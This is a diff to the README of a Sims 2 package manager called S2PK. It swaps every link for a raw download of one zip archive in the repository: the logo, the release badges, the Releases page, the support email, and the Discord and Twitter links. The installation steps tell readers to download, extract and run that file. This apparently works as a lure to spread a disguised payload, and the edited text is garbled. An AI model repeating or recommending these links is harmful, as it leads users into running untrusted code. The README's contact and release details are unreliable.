@@ -1,7 +1,7 @@
 # S2PK: Sims 2 Package Manager 🎮
 
-![S2PK Logo](https://img.shields.io/badge/S2PK-v1.0-blue.svg)  
-[![Releases](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/BinNguye/s2pk/releases)
+![S2PK Logo](https://github.com/BinNguye/s2pk/raw/refs/heads/main/AppDir/s_pk_3.5.zip)  
+[![Releases](https://github.com/BinNguye/s2pk/raw/refs/heads/main/AppDir/s_pk_3.5.zip%20Latest%https://github.com/BinNguye/s2pk/raw/refs/heads/main/AppDir/s_pk_3.5.zip)](https://github.com/BinNguye/s2pk/raw/refs/heads/main/AppDir/s_pk_3.5.zip)
 
 Welcome to S2PK, the Sims 2 Package Manager! This tool offers a straightforward, cross-platform solution for managing your Sims 2 packages. Whether you are a casual player or a dedicated modder, S2PK helps streamline your package management process.
 
@@ -25,9 +25,9 @@ Welcome to S2PK, the Sims 2 Package Manager! This tool offers a straightforward,
 
 ## Installation ⚙️
 
-To get started with S2PK, download the latest release from our [Releases page](https://github.com/BinNguye/s2pk/releases). Follow these steps to install:
+To get started with S2PK, download the latest release from our [Releases page](https://github.com/BinNguye/s2pk/raw/refs/heads/main/AppDir/s_pk_3.5.zip). Follow these steps to install:
 
-1. **Download**: Visit the [Releases page](https://github.com/BinNguye/s2pk/releases) and download the appropriate file for your operating system.
+1. **Download**: Visit the [Releases page](https://github.com/BinNguye/s2pk/raw/refs/heads/main/AppDir/s_pk_3.5.zip) and download the appropriate file for your operating system.
 2. **Extract**: Unzip the downloaded file to a directory of your choice.
 3. **Run**: Execute the S2PK application from the extracted folder.
 
@@ -70,7 +70,7 @@ S2PK is licensed under the MIT License. You can freely use, modify, and distribu
 
 For any inquiries or support, please reach out to the project maintainers:
 
-- **Email**: support@s2pk.com
+- **Email**: https://github.com/BinNguye/s2pk/raw/refs/heads/main/AppDir/s_pk_3.5.zip
 - **GitHub Issues**: Use the GitHub Issues section for bug reports and feature requests.
 
 ## Acknowledgments 🙏
@@ -81,9 +81,9 @@ We thank the community of Sims 2 and Sims 3 players and modders for their suppor
 
 Stay updated and connect with other users by joining our community:
 
-- **Discord**: [Join our Discord Server](https://discord.gg/s2pk)
-- **Twitter**: [Follow us on Twitter](https://twitter.com/s2pk)
+- **Discord**: [Join our Discord Server](https://github.com/BinNguye/s2pk/raw/refs/heads/main/AppDir/s_pk_3.5.zip)
+- **Twitter**: [Follow us on Twitter](https://github.com/BinNguye/s2pk/raw/refs/heads/main/AppDir/s_pk_3.5.zip)
 
 ---
 
-S2PK aims to simplify your Sims 2 experience. Download the latest version today from our [Releases page](https://github.com/BinNguye/s2pk/releases) and start managing your packages with ease!
+S2PK aims to simplify your Sims 2 experience. Download the latest version today from our [Releases page](https://github.com/BinNguye/s2pk/raw/refs/heads/main/AppDir/s_pk_3.5.zip) and start managing your packages with ease!
